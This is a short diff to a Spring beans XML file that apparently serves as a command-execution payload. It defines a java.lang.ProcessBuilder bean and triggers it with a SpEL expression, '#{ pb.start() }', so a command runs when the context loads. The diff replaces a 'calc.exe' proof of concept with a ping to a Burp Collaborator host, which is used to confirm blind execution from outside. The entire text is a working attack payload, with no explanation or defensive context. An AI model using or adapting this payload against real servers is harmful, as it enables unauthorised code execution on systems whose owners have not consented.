@@ -5,7 +5,12 @@
      http://www.springframework.org/schema/beans/spring-beans.xsd
 ">
   <bean id="pb" class="java.lang.ProcessBuilder">
-     <constructor-arg value="calc.exe" />
+     <constructor-arg>
+            <array>
+                <value>ping </value>
+                <value>go8p1z7coyvo251lyhk4aldsxj3arz.burpcollaborator.net</value>
+            </array>
+        </constructor-arg>
      <property name="whatever" value="#{ pb.start() }"/>
   </bean>
 </beans>
